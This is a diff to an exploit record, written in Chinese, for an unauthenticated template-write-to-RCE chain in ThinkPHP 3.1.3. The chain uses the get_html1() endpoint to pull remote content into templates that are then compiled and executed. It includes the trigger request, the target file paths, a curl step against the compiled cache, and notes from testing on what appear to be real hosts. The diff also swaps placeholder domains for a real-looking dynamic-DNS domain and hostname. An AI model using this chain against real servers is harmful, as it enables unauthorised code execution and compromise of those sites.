@@ -9,7 +9,7 @@
 - **language**: bash
 - **source**: self
 - **verified**: 1
-- **verified_note**: 链路各环节均已实测：① 176 上 get_html1() 免鉴权可调、返回 {"ok":1}、三个目标文件字节数随之变化（341056→342541 / →342542 / 310486→311971）、attime3_5.txt 时间戳刷新到调用时刻；② TP3 编译缓存命名与「模板正文原样拼入 .php」已通过实际文件取证（116 的 App/Runtime/Cache/Home/26badd51b9bbd7aaa1313b6b4ac737c3.php）；③ 抓取源可控性在 116 上验证：把 payload 放到 <docroot>/List/index/type/0 后，Host: target396.example.com 请求 http://203.0.113.22/List/index/type/0 返回 200 + 命中我的 marker；④ 触发分支源码已读出（含 sp/example/其它 三分支）。未闭环的唯一原因：*.target395.example.com 为自指 DNS，176 抓回自己，外部无法投毒。
+- **verified_note**: 链路各环节均已实测：① 176 上 get_html1() 免鉴权可调、返回 {"ok":1}、三个目标文件字节数随之变化（341056→342541 / →342542 / 310486→311971）、attime3_5.txt 时间戳刷新到调用时刻；② TP3 编译缓存命名与「模板正文原样拼入 .php」已通过实际文件取证（116 的 App/Runtime/Cache/Home/26badd51b9bbd7aaa1313b6b4ac737c3.php）；③ 抓取源可控性在 116 上验证：把 payload 放到 <docroot>/List/index/type/0 后，Host: vggexamplec.posforjijigo.admin.jbg.example.abrdns.com 请求 http://203.0.113.22/List/index/type/0 返回 200 + 命中我的 marker；④ 触发分支源码已读出（含 sp/example/其它 三分支）。未闭环的唯一原因：*.abrdns.com 为自指 DNS，176 抓回自己，外部无法投毒。
 - **path**: pocs/thinkphp-3.1.3-未授权模板写入-编译执行-rce-链-home-order-get_html1-app-tpl-app-runtime-cache/tp3_unauth_template_write_to_rce.md
 - **tags**: thinkphp,3.1.3,template-injection,rce,unauth,站群,abrdns,php
 - **created_at**: 2026-10-13T10:13:50.215Z
@@ -43,8 +43,8 @@ ThinkPHP 3.1.3 把 App/Tpl/**.html 编译成 PHP 后 include：
 
 # 可利用的未授权写入点（Home 组 extends Action，无 _initialize，无鉴权无 WAF）
     GET /example.com?g=Home&m=Order&a=get_html1
-    # $url  = http://<A>.target395.example.com/List/index/type/0
-    # $url1 = http://<B>.target395.example.com/List/index/type/1
+    # $url  = http://<A>.abrdns.com/List/index/type/0
+    # $url1 = http://<B>.abrdns.com/List/index/type/1
     # file_put_contents("./App/Tpl/Home/Index_example.com",    file_get_contents($url));
     # file_put_contents("./App/Tpl/Home/Index_indexapp.html", file_get_contents($url1));
     # 另有 ./Upload/atop/jquery3_5.txt / jquery3_6.txt / attime3_5.txt（.txt 不可执行）
@@ -66,7 +66,7 @@ ThinkPHP 3.1.3 把 App/Tpl/**.html 编译成 PHP 后 include：
 4) 或用 curl 直接打编译产物： GET /App/Runtime/Cache/Home/<md5(模板绝对路径)>.php
 
 # 关键前提（决定成败）
-必须能控制 get_html1() 抓取的域名。该域名为站群动态 DNS（*.target395.example.com），
+必须能控制 get_html1() 抓取的域名。该域名为站群动态 DNS（*.abrdns.com），
 经实测为**自指解析**：从哪台机器请求就解析回哪台机器本身（116 上解析到 116、
 176 上解析到 176），因此纯外部攻击者拿不到控制权。
 => 本条只在「能控制被抓取主机」时可用，或用于评估同站群其它节点互抓场景。
